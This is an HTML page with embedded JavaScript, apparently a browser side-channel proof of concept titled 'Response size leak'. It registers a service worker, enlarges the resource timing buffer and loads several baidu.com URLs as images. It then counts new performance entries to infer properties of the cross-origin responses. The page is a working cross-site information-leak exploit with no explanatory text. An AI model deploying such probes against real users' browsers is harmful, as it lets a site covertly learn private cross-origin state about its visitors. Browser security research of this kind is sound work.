<!DOCTYPE html>
<html>
  <head>
    <title>Response size leak</title>
    <script>
      if ("serviceWorker" in navigator) {
        addEventListener("load", async () => {
          performance.setResourceTimingBufferSize(1337);
          const registration = await navigator.serviceWorker.register("static/serviceworker.js");
          if (registration.installing)
            location.reload();
        });
      }

      function singleSizeCheck(url, size) {
        let start = performance.getEntries().length;
        let element = document.createElement('img');
        element.src = `${url}?size=1`;
        return new Promise((resolve) => {
          element.onload = () => {
            let diff = performance.getEntries().length - start;
            document.body.innerHTML += url + ' onload ' + diff + '<br>';
            return resolve(diff);
          }

          element.onerror = () => {
            let diff = performance.getEntries().length - start;
            document.body.innerHTML += url + ' onerror ' + diff + '<br>';
            return resolve(diff);
          }
        });
      }

      function run() {
        setTimeout(singleSizeCheck, 1000, 'https://www.baidu.com/robots.txt', 1);
        setTimeout(singleSizeCheck, 2000, 'https://www.baidu.com/asdfas', 1);
        setTimeout(singleSizeCheck, 3000, 'https://www.baidu.com/favicon.ico', 1);
        setTimeout(console.log, 3000, performance.getEntries());
      }
      
      onload = () => {
        run();
      }

    </script>
  </head>

  <body></body>

</html>